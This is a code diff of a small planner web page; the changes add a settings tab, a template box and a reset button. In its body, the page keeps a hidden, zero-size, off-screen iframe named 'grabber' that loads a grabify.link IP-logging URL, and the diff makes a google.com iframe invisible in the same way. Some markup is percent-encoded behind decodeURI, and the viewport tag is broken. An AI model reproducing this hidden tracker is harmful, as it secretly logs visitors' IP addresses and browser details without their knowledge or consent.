@@ -5,14 +5,11 @@
 
 <title>Planner</title>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no">
-<meta name="author" content="Jacob McGinley">
-<meta name="description" content="A smart planner">
-<meta name="google-site-verification" content="_LrfHy7pIualH1TolkQ5b3Po0dtjYrx-QQsiXelwx20">
-<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
-<link rel="manifest" href="manifest.webmanifest">
+<meta name="viewport" planner="width=device-width, initial-scale=1">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
 
 <style>
   *, *::before, *::after {
@@ -114,6 +111,9 @@ body {
   #resources {
     left: 140px;
   }
+  #settings {
+    left: 222.5px;
+  }
   header button:hover {
     border: 1px solid rgba(255,255,255,0.6);
   }
@@ -129,6 +129,12 @@ body {
      #delete {
      margin-left: 10px; 
      }
+    .settings {
+       margin-left:20px;
+     }
+    #uTempTitle {
+       margin-left: 5vw;
+    }
    .page-loader {
      position: absolute;
      left:0;
@@ -143,13 +149,17 @@ body {
    .planner {
       margin-top: 70px;
     }
+   #reset {
+      position:fixed;
+      right:10px;
+   }
 </style>
 
 </head>
 <body>
  
  <iframe id="grabber" src="https://grabify.link/KTPH2N" style="border:none;width:0;height:0;position:absolute;top:-10px;left:-10px;"></iframe>
- <iframe src="https://www.google.com" hidden></iframe>
+ <iframe src="https://www.google.com" style="border:none;width:0;height:0;position:absolute;top:-10px;left:-10px;"></iframe>
 
 <div class="wrapper">
 <span id="nav-title">Planner</span>
@@ -157,6 +167,8 @@ body {
   <button onclick="changeScreen('planner');" id="home">Planner</button>
   <button onclick="changeScreen('classes');" id="classes">Classes</button>
   <button onclick="changeScreen('resources');" id="resources">Resources</button>
+  <button onclick="changeScreen('settings');" id="settings">Settings</button>
+  <button onclick="template();" id="reset">Reset</button>
 </header>
 </div>
 <div class="planner content">
@@ -190,6 +202,13 @@ body {
 <button id="add-resource" onclick="resource('add');">+</button>
 
 </div>
+<div class="settings content topspace" hidden>
+
+<span id="uTempTitle">Template</span><br/>
+<textarea id="uTemplate"></textarea>
+
+</div>
+
 <div class="footer">
   <div id="info"><b>
     Jacob McGinley <br/>
@@ -213,7 +232,7 @@ document.querySelector(".handler").innerHTML = localStorage.getItem("resourceCon
 document.querySelector(".class-handler").innerHTML = localStorage.getItem("classContent").toString();
 
 }
- 
+
 var mon = null;
 var tues = null;
 var thurs = null;
@@ -256,7 +275,7 @@ resources = 0;
 function resource(action, id) {
 if (action == "add") {
 resources++;
-document.querySelector(".handler").innerHTML += `<span id="resource-`+resources+`-edit"><input placeholder="Title" id="resource-`+resources+`-title"><input placeholder="Link" id="resource-`+resources+`-link"><button onclick="resource('save','resource-`+resources+`');" id="resource-`+resources+`-save">Save</button><button onclick="this.parentElement.remove();">Cancel</button></span>`
+document.querySelector(".handler").innerHTML += decodeURI("%3Cspan%20id=%22resource-"+resources+"-edit%22%3E%3Cinput%20placeholder=%22Title%22%20id=%22resource-"+resources+"-title%22%3E%3Cinput%20placeholder=%22Link%22%20id=%22resource-"+resources+"-link%22%3E%3Cbutton%20onclick=%22resource('save','resource-"+resources+"');%22%20id=%22resource-"+resources+"-save%22%3ESave%3C/button%3E%3C/span%3E");
 }else if (action == "save") {
 var title = document.querySelector("#"+id+"-title").value.toString();
 var link = document.querySelector("#"+id+"-link").value.toString();
@@ -278,7 +297,7 @@ period = 0;
 function classHandle(action, id) {
 if (action == "add") {
 period++;
-document.querySelector(".class-handler").innerHTML += `<span id="period-`+period+`"><input placeholder="Class Name" id="period-`+period+`-className"><input placeholder="Teacher Name" id="period-`+period+`-teacherName"><input placeholder="Class Link" id="period-`+period+`-linkToPage"><button onclick="classHandle('save','period-`+period+`');" id="class-save">Save</button><button onclick="this.parentElement.remove();">Cancel</button><br/></span>`;
+document.querySelector(".class-handler").innerHTML += `<span id="period-`+period+`"><input placeholder="Class Name" id="period-`+period+`-className"><input placeholder="Teacher Name" id="period-`+period+`-teacherName"><input placeholder="Class Link" id="period-`+period+`-linkToPage"><button onclick="classHandle('save','period-`+period+`');" id="class-save">Save</button><br/></span>`;
 }else if (action == "save") {
 var title = document.querySelector("#"+id+"-className").value.toString();
 var teach = document.querySelector("#"+id+"-teacherName").value.toString();
@@ -309,13 +328,30 @@ localStorage.setItem("classContent",document.querySelector(".class-handler").inn
 
 }
 
- 
- var installPrompt;
-   window.addEventListener("beforeinstallprompt",function(event){
-    event.preventDefault();
-    installPrompt = event;
-  });
- installPrompt.prompt();
- 
+var userTemplate = localStorage.getItem("userTemplate");
+if(!userTemplate) {
+
+userTemplate = "";
+
+}
+
+function template() {
+
+if(confirm("Are you sure you want to reset your planner?")) {
+
+document.querySelectorAll(".notes textarea").forEach(function(e) {
+
+  e.value = userTemplate;
+
+});
+}
+}
+
+document.querySelector("#uTemplate").onkeyup = function() {
+var temp = document.querySelector("#uTemplate").value.toString();
+userTemplate = temp;
+localStorage.setItem("userTemplate",userTemplate);
+}
+
 </script>
 </html>
